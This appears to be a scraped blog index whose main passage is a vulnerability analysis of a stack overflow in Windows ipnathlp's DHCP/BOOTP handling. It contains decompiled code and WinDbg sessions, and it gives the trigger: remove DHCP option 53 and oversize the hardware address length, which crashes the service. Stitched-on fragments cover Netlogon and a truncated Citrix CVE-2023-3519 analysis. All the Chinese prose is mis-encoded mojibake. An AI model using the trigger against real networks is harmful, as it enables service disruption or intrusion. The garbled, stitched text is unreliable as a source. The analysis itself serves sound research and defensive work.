memset_0(\u0026amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( v4 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v4 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v4 + 25) \u0026gt;= 4u ) WPP_SF_dD( *((_QWORD *)v4 + 2), 97i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids, *((unsigned __int8 *)a2 + 230), 32); _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics); } DumpDhcpHeaderInfo(a2); // ä¿®å¤ä»£ç  void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v11, 0, 0x40ui64); DumpDhcpHeaderInfo(a2); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_dd( *((_QWORD *)WPP_GLOBAL_Control + 2), 97i64, \u0026amp;WPP_df007ca3347434f5610fc5a17e95e0a3_Traceguids, *((unsigned __int8 *)a2 + 230), 32); } goto LABEL_10; } LABEL_10: _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics);// è¿™é‡Œå¤šäº†è°ƒç”¨ goto LABEL_11; ...... LABEL_11: EnterCriticalSection(\u0026amp;DhcpInterfaceLock); if ( *((int *)a1 + 19) \u0026lt; 0 ) { LeaveCriticalSection(\u0026amp;DhcpInterfaceLock); ç•¥è¿‡çš„ä»£ç ä¸­ï¼Œè¯»å–äº†a2å‚æ•°çš„ä»£ç å¦‚ä¸‹ï¼š\nif ( DhcpExtractOptionsFromMessage((struct _NH_BUFFER *)((char *)a2 + 228), *((_DWORD *)a2 + 55), \u0026amp;v11) ) ..... if ( !v12 ) { ..... DhcpProcessBootpMessage(a1, a2, \u0026amp;v11); goto LABEL_11; } ..... if ( DhcpIsLocalHardwareAddress((unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)) ) { .... } v7 = *(unsigned __int8 *)(v12 + 2); if ( v7 == 1 ) { ..... DhcpProcessDiscoverMessage(a1, a2, \u0026amp;v11); } else if ( *(_BYTE *)(v12 + 2) == 3 ) { ...... DhcpProcessRequestMessage(a1, a2, \u0026amp;v11); } ...... } if ( !DhcpArpForDad ) { v10 = *(_DWORD *)(v13 + 2); DhcpRemoveArpEntry(v10); DhcpCancelLease(v10, (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); ..... } else { if ( *(_BYTE *)(v12 + 2) != 7 ) { if ( *(_BYTE *)(v12 + 2) == 8 ) { ...... DhcpProcessInformMessage(a1, a2, \u0026amp;v11); } else { ...... } goto LABEL_11; } if ( !DhcpArpForDad ) { DhcpRemoveArpEntry(*((_DWORD *)a2 + 60)); DhcpCancelLease(*((_DWORD *)a2 + 60), (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); } ...... } æŸ¥çœ‹è¿™äº›å‡½æ•°ä»£ç ï¼Œåœ¨ DhcpProcessBootpMessageå‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘\nvoid __fastcall DhcpProcessBootpMessage( v3 = a2; v5 = (char *)v3 + 228; ...... else { if ( !DhcpSendUnicastMessagesEnabled || v5[10] \u0026lt; 0 || DhcpAddArpEntry(v6, (unsigned __int8 *)v5 + 28, (unsigned __int8)v5[2], v23) )// è¿™ä¸ªå‡½æ•°è§¦å‘äº†æ¼æ´ { // movzx r8d, byte ptr [r15+2] ; Size ... å‰é¢çŸ¥é“ a2 + 230æ˜¯é•¿åº¦å­—æ®µï¼Œv5=v2+228ï¼Œä¼ å…¥ DhcpAddArpEntryçš„sizeå‚æ•°ä¸ºv5+2ï¼Œä¹Ÿå°±æ˜¯a2 + 230 åœ¨ DhcpAddArpEntryå‡½æ•°ä¸­ï¼ŒRowä¸ºæ ˆå†…ç»“æ„ä½“ï¼Œmemcpyä¼ å…¥çš„é•¿åº¦å‚æ•°ä¸ºa2 + 230ï¼Œä¹Ÿå°±æ˜¯è¡¥ä¸ä¸­åˆ¤æ–­çš„é•¿åº¦å‚æ•°ã€‚ MIB_IPNET_ROW2ç»“æ„ä½“å®šä¹‰å¯ä»¥åœ¨\rè¿™æ‰¾åˆ°ï¼Œå…¶å¤§å°ä¸º0x58\n__int64 __fastcall DhcpAddArpEntry(DWORD a1, unsigned __int8 *Src, size_t Size, struct _DHCP_INTERFACE *a4) { MIB_IPNET_ROW2 Row; ...... v4 = (unsigned int)Size; ..... memset_0(\u0026amp;Row, 0, sizeof(Row)); Row.InterfaceIndex = DhcpAdapterIndex; Row.Address.Ipv4.sin_family = 2; Row.Address.Ipv4.sin_addr.S_un.S_addr = a1; Row.PhysicalAddressLength = v4; memcpy_0(Row.PhysicalAddress, Src, v4); ...... return v11; } } æ‰€ä»¥æ¼æ´è§¦å‘è·¯å¾„ä¸º DhcpProcessMessage-\u0026gt;DhcpProcessBootpMessage-\u0026gt;DhcpAddArpEntry-\u0026gt;memcpy_0ï¼Œå½“é•¿åº¦å‚æ•°è¿‡é•¿æ—¶å¯ä»¥åˆ©ç”¨memcpyè§¦å‘æ ˆæº¢å‡ºã€‚\nåŠ¨æ€è°ƒè¯• ä½¿ç”¨windbgé™„åŠ åˆ°svchostè¿›ç¨‹ï¼Œåœ¨ ipnathlp!DhcpProcessMessageæ–­ç‚¹ï¼Œè€Œåè§¦å‘DHCPè¯·æ±‚ï¼Œwindbgåœ¨ ipnathlp!DhcpProcessMessageæ–­ä¸‹ ç”±äºä¸çŸ¥é“ DhcpProcessMessageçš„a2ç»“æ„ä½“å®šä¹‰ï¼Œæ­¤å¤„æ„é€ æ­£å¸¸çš„DHCPè¯·æ±‚ï¼Œå¹¶åœ¨è°ƒè¯•å™¨ä¸­æŸ¥çœ‹è¿™ä¸ªç»“æ„ä½“æˆå‘˜ä¿¡æ¯ã€‚ å•æ­¥è¿è¡Œåˆ°åˆ¤æ–­é•¿åº¦çš„åœ°æ–¹ï¼Œæ­¤æ—¶rsiæŒ‡å‘ä¼ å…¥çš„ _NH_BUFFERç»“æ„ä½“ï¼Œ\n0:004\u0026gt; u ipnathlp!DhcpProcessMessage+0x7f: 00007ff9`c00176f3 488dbee4000000 lea rdi,[rsi+0E4h] 00007ff9`c00176fa 41b604 mov r14b,4 00007ff9`c00176fd 807f0220 cmp byte ptr [rdi+2],20h 00007ff9`c0017701 7636 jbe ipnathlp!DhcpProcessMessage+0xc5 (00007ff9`c0017739) 00007ff9`c0017703 493bdc cmp rbx,r12 00007ff9`c0017706 742a je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) 00007ff9`c0017708 44847b1c test byte ptr [rbx+1Ch],r15b 00007ff9`c001770c 7424 je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) å¯ä»¥åœ¨è°ƒè¯•å™¨å†…çœ‹åˆ° (_BYTE *)a2 + 230)å€¼ä¸º6\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ è€Œè¯¥å¤„æ•°æ®æ¥æºäºDHCPå®¢æˆ·ç«¯å‘é€çš„DHCPè¯·æ±‚ï¼Œåœ¨wiresharkä¸­å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…ä¸­åˆšå¥½æœ‰é•¿åº¦å­—æ®µå€¼ä¸º6ï¼Œè¯´æ˜(_BYTE *)a2 + 230)å¤„æœ‰å¯èƒ½æ˜¯æ•°æ®åŒ…å†…çš„Hardware address lengthã€‚\næ­¤æ—¶è°ƒç”¨æ ˆï¼š\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x86 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 æ­¤æ—¶å°è¯•æ‰‹åŠ¨å°†(_BYTE *)a2 + 230)ä¿®æ”¹ä¸º0xfeï¼Œç»§ç»­è¿è¡Œï¼Œä½†æ²¡æœ‰è§¦å‘å¼‚å¸¸ã€‚\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:004\u0026gt; eb rdi+2 fe 0:004\u0026gt; db rdi+2 00000203`faa1fdb6 fe 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:002\u0026gt; g Breakpoint 0 hit ipnathlp!DhcpProcessMessage: 00007ff9`c0017674 48895c2418 mov qword ptr [rsp+18h],rbx ss:0000000e`346ff630=00000203faa7e350 æ”¹ä¸ºå•æ­¥è°ƒè¯•ï¼Œå†æ¬¡å‘èµ·DHCPè¯·æ±‚ï¼Œå‘ç°æ²¡æœ‰è¿›å…¥åˆ°æ¼æ´å‡½æ•° DhcpProcessBootpMessageä¸­ï¼ŒåŸå› æ˜¯v13ä¸ä¸º0ï¼Œæ¡ä»¶ä¸æˆç«‹ï¼Œä¸ä¼šè°ƒç”¨ DhcpProcessBootpMessage\nif ( !v13 ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 98i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); } DhcpProcessBootpMessage(a1, a2, \u0026amp;v12); // è¿™é‡Œè§¦å‘æ¼æ´ goto LABEL_25; } å¯¹v13ä¸‹å†™æ–­ç‚¹\n0:004\u0026gt; ba w1 rsp+0x38 0:004\u0026gt; g Breakpoint 6 hit msvcrt!memset+0x35: 00007ff9`ed1046b5 4983e908 sub r9,8 è§¦å‘æ–­ç‚¹ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œå¯¹åº”ä»£ç ä¸º memset_0(a3, 0, 0x40ui64);\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f418 00007ff9`c0015b63 msvcrt!memset+0x35 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x7b 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 æ­¤å¤„å°†ç›®æ ‡å†…å­˜æ¸…é›¶ï¼Œä¸ç¬¦åˆå‰é¢è¯´çš„æ¡ä»¶ï¼Œç»§ç»­è¿è¡Œï¼Œå†æ¬¡è§¦å‘å†™æ–­ï¼Œè°ƒç”¨æ ˆä¸º\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x428 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 å¯¹åº”åœ¨DhcpExtractOptionsFromMessageçš„ä»£ç å¦‚ä¸‹ï¼Œå½“OptionIDä¸º0x35æ—¶è¿›å…¥caseè¯­å¥å†…\nv9 = (struct _DHCP_OPTION *)((char *)a1 + 240); OptionID = v9-\u0026gt;OptionID; if ( OptionID ) { switch ( OptionID ) case 0x35u: if ( v6 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v6 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v6 + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)v6 + 2), 44i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); v6 = WPP_GLOBAL_Control; } if ( BYTE1(v9-\u0026gt;OptionID) ) { a3[1] = v9; } _DHCP_OPTIONç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œå¯¹åº”äºDHCPè¯·æ±‚å†…çš„option\ntypedef DWORD DHCP_OPTION_ID; struct _DHCP_OPTION { DHCP_OPTION_ID OptionID; LPWSTR OptionName; LPWSTR OptionComment; DHCP_OPTION_DATA DefaultValue; DHCP_OPTION_TYPE OptionType; }; 0:002\u0026gt; db rdi 00000203`faa1fea4 35 01 03 3d 07 01 00 0c-29 c2 3a 42 32 04 c0 a8 5..=....).:B2... 00000203`faa1feb4 89 cd 0c 0f 44 45 53 4b-54 4f 50 2d 54 35 50 37 ....DESKTOP-T5P7 00000203`faa1fec4 34 45 53 51 12 00 00 00-44 45 53 4b 54 4f 50 2d 4ESQ....DESKTOP- 00000203`faa1fed4 54 35 50 37 34 45 53 3c-08 4d 53 46 54 20 35 2e T5P74ES\u0026lt;.MSFT 5. 00000203`faa1fee4 30 37 0e 01 03 06 0f 1f-21 2b 2c 2e 2f 77 79 f9 07......!+,./wy. æ ¹æ®RFC rfc2132 option 53ä¸ºä¼ é€’DHCPæ¶ˆæ¯ç±»å‹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯æ“ä½œç¼–å·ï¼Œç¬¬äºŒä¸ªå­—èŠ‚æ’ä¸º1ï¼Œç¬¬ä¸‰ä¸ªå­—èŠ‚æ˜¯æ¶ˆæ¯ç±»å‹ï¼ŒèŒƒå›´æ˜¯1-9 æ ¹æ®ä»£ç ï¼Œå½“DHCPä¸­å«æœ‰option 53ä¸€å®šä¼šè¿›å…¥ DhcpExtractOptionsFromMessageçš„ if ( BYTE1(v9-\u0026gt;OptionID) )ï¼ŒæŠŠa3[1]èµ‹å€¼ä¸ºä¸ä¸ºé›¶çš„å€¼ã€‚ å›åˆ°DhcpProcessMessageå†…ï¼Œv13å°±ä¸ä¸º0ï¼Œä¸èƒ½è¿›å…¥è§¦å‘æ¼æ´çš„é€»è¾‘ é‡æ–°æ„é€ DHCPæ•°æ®åŒ…,ï¼Œåˆ é™¤option53å¹¶å°† Hardware address lengthæ”¹ä¸º100ï¼Œå•æ­¥è°ƒè¯•ï¼ŒæˆåŠŸè¿›å…¥åˆ° DhcpAddArpEntryå‡½æ•°å†…ã€‚\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f2a0 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x14a 0000000e`3487f380 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œmemcpyæ—¶é•¿åº¦å‚æ•°ä¸º0x64ï¼Œç»§ç»­è¿è¡Œåˆ™è§¦å‘äº†æ ˆæº¢å‡ºï¼Œè¿›ç¨‹å¼‚å¸¸é€€å‡ºã€‚\n0:005\u0026gt; g Breakpoint 9 hit ipnathlp!DhcpAddArpEntry+0x184: 00007ff9`c0012570 e83db80600 call ipnathlp!memcpy (00007ff9`c007ddb2) 0:005\u0026gt; rr8 r8=0000000000000064 0:005\u0026gt; g STATUS_STACK_BUFFER_OVERRUN encountered (1858.3b4): Break instruction exception - code 80000003 (first chance) KERNELBASE!UnhandledExceptionFilter+0x7c: 00007ff9`ec55dd3c cc int 3 0:005\u0026gt; k Child-SP RetAddr Call Site 0000000e`34b7efa0 00007ff9`c007d096 KERNELBASE!UnhandledExceptionFilter+0x7c 0000000e`34b7f0c0 00007ff9`c007d229 ipnathlp!_raise_securityfailure+0x1a 0000000e`34b7f0f0 00007ff9`c0012600 ipnathlp!_report_gsfailure+0x169 0000000e`34b7f180 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x214 0000000e`34b7f260 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`34b7f360 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`34b7f420 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`34b7f480 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`34b7f4b0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`34b7f4f0 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`34b7f7f0 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`34b7f820 00000000`00000000 ntdll!RtlUserThreadStart+0x21 0:005\u0026gt; g ntdll!NtWaitForWorkViaWorkerFactory+0x14: 00007ff9`eeb70aa4 c3 ret wireshrkä¸­å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…åè®®ä¸ºBootpã€‚ PoCå‚è€ƒ\rç®€å•å®ç°çš„DHCP Clientå¹¶å°†option 53æ³¨é‡Šï¼Œå°† Hardware address lengthæ”¹ä¸º0x100ã€‚ è¿™ä¸ªæ ˆæº¢å‡ºé•¿åº¦å’Œå†…å®¹å‡ä¸ºå†…å®¹å¯æ§\nå°ç»“ è¿™ä¸ªæ¼æ´èµ·æºäºmemcpyæ—¶srcå’Œlenå‚æ•°å‡æ¥æºäºæ•°æ®åŒ…å†…ï¼Œä¸ºç”¨æˆ·å¯æ§ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾ç½®è¿‡é•¿é•¿åº¦è§¦å‘memcpyè¶Šç•Œå†™å…¥ï¼Œè§¦å‘æ—¶çš„æ¼æ´å‡½æ•°ä¸ºå¤„ç†BOOTPåè®®ï¼Œè¿™ä¸ªåè®®æ˜¯DHCPåè®®å‰èº«ï¼ŒDHCPå…¼å®¹è¿™ä¸ªåè®®ï¼Œåœ¨å¤„ç†Bootpæ¶ˆæ¯æ—¶ï¼Œæ²¡æœ‰æ£€æŸ¥é•¿åº¦å¯¼è‡´åœ¨å¤åˆ¶macæ—¶å‡ºé”™ã€‚\nå‚è€ƒé“¾æ¥\nhttps://bbs.kanxue.com/thread-278835.htm https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code\nCreated at 2023-09-18T16:18:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/netlogon/","title":"Netlogon","tags":[],"description":"","content":"Overview Netlogon è¿œç¨‹åè®®å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åªèƒ½åœ¨åŠ å…¥åŸŸçš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚\nnetlogonåè®®çš„äº¤äº’è¿‡ç¨‹å¯ä»¥è¯¦ç»†è§£é‡Šå¦‚ä¸‹:\nå®¢æˆ·ç«¯å‘èµ·è¿æ¥,å‘é€åŒ…å«8å­—èŠ‚çš„ClientChallengeçš„NetrServerReqChallenge RPCè°ƒç”¨ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ”¶åˆ°è°ƒç”¨å,ç”Ÿæˆ8å­—èŠ‚çš„ServerChallengeå‘å›å®¢æˆ·ç«¯ å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä½¿ç”¨Key Derivation FunctionåŸºäºClientChallengeã€ServerChallengeå’Œå¯†ç çš„hashç”Ÿæˆä¼šè¯å¯†é’¥ å®¢æˆ·ç«¯ä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†ClientChallengeè®¡ç®—ClientCredential,å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨ç«¯ä¼šè¯å¯†é’¥å’ŒClientChallengeè®¡ç®—ClientCredentialï¼Œå’Œå®¢æˆ·ç«¯å‘é€çš„ClientCredentialæ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ æœåŠ¡å™¨ç«¯ä½¿ç”¨ä¼šè¯å¯†é’¥å’ŒServerCallengeè®¡ç®—ServerCredentialï¼Œå‘ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯ä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†ServerCallengeè®¡ç®—ServerCredentialå¹¶å’ŒæœåŠ¡ç«¯å‘é€çš„ServerCredentialä½œæ¯”è¾ƒï¼Œç›¸åŒåˆ™æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½å®Œæˆäº†èº«ä»½æ ¡éªŒ MS-NRPC\nCreated at 2023-08-10T03:30:09+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/","title":"CVE-2023-3519 Cirtix Gateway RCEåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Citrix ADC åŠ Citrix Gateway ä¸­å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œæœªæˆæƒçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹æ®Šè¯·æ±‚è§¦å‘æ¼æ´ï¼Œé€ æˆRCEã€‚\nå½±å“ç‰ˆæœ¬ NetScaler ADC ã€NetScaler Gateway 13.1 \u0026lt; 13.1-49.13 NetScaler ADC ã€NetScaler Gatewayâ€¯13.0â€¯\u0026lt; 13.0-91.13 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.159 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.297\nç¯å¢ƒæ­å»º ç”³è¯·å¼€å‘è€…è¯•ç”¨ï¼Œé…ç½®Citrix Gateway æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• æ ¹æ®å›½å¤–å®‰å…¨ç ”ç©¶å‘˜ç ”ç©¶ï¼Œè¯¥æ¼æ´å­˜åœ¨äº/netscaler/nsppeæ–‡ä»¶å†…ï¼Œdiffä¿®å¤å‰å’Œä¿®å¤åçš„nsppeï¼Œä¸»è¦ä¿®æ”¹äº†ns_aaa_gwtest_get_event_and_target_namesç­‰å‡ ä¸ªå‡½æ•° è½¬åˆ°ns_aaa_gwtest_get_event_and_target_nameså‡½æ•°ï¼Œå¯¹æ¯”ä¿®å¤å’Œæœªä¿®å¤çš„ä»£ç ï¼Œä¸»è¦åœ¨è°ƒç”¨ns_aaa_saml_url_decodeå‡½æ•°æ—¶å¯¹v29æ·»åŠ äº†æ ¡éªŒã€‚ è·Ÿè¿›ns_aaa_saml_url_decodeå‡½æ•°ï¼Œè¿›å…¥ns_aaa_saml_url_decode_inner\n__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } åœ¨ns_aaa_saml_url_decode_innerå‡½æ•°ä¸­a1æ˜¯ä¸€ä¸ªcharæŒ‡é’ˆï¼ŒæŒ‡å‘äº†httpè¯·æ±‚çš„urlï¼Œåœ¨do whileå¾ªç¯æ—¶éå†a1æ•°ç»„ï¼Œå½“å½“å‰a1æŒ‡å‘çš„å­—ç¬¦æ˜¯%ï¼Œåˆ™è·å–åˆ°è¯¥å­—ç¬¦åé¢ä¸¤ä¸ªå­—ç¬¦é€šè¿‡datatable_ascii2binå¾—åˆ°å¯¹åº”çš„å­—ç¬¦å¹¶å†™å…¥åˆ°v4æŒ‡å‘çš„æ•°ç»„å†…ï¼Œå®é™…ä¸Šè¿™é‡Œæ˜¯urlè§£ç æ“ä½œï¼Œè§£ç åå†™å…¥v4æ•°ç»„ã€‚ å¦‚æœå½“å‰å­—ç¬¦ä¸æ˜¯%åˆ™åˆ¤æ–­æ˜¯ä¸æ˜¯+å·ï¼Œæ˜¯+å·åˆ™åœ¨v4æ•°ç»„å†…å†™å…¥ç©ºæ ¼ã€‚ä¸¤ä¸ªéƒ½ä¸æ˜¯åˆ™ç›´æ¥å†™å…¥åˆ°v4å†…ï¼Œå¯ä»¥çœ‹å‡ºè¿™å—ä»£ç æ˜¯åœ¨å¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²åˆ¤æ–­æ˜¯å¦ä¸ºurlç¼–ç å¦‚æœæ˜¯åˆ™è¿›è¡Œurlè§£ç ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥å†™å…¥v4æ•°ç»„ã€‚\n__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)\u0026amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == \u0026#39;%\u0026#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) \u0026lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) \u0026lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) \u0026lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) \u0026lt; 6u ) { if ( v9 != 53 ) v7 = a1; if ( (unsigned __int64)(a1 + 4) \u0026gt;= v5 ) v7 = a1; if ( v8 != 50 ) v7 = a1; if ( !a4 ) v7 = a1; *v4 = datatable_ascii2bin[(unsigned __int8)v7[2]] + 16 * datatable_ascii2bin[(unsigned __int8)v7[1]]; a1 = v7 + 3; goto LABEL_4; } } } } else if ( v6 == \u0026#39;+\u0026#39; ) { *v4 = 32; ++a1; goto LABEL_4; } ++a1; *v4 = v6; LABEL_4: 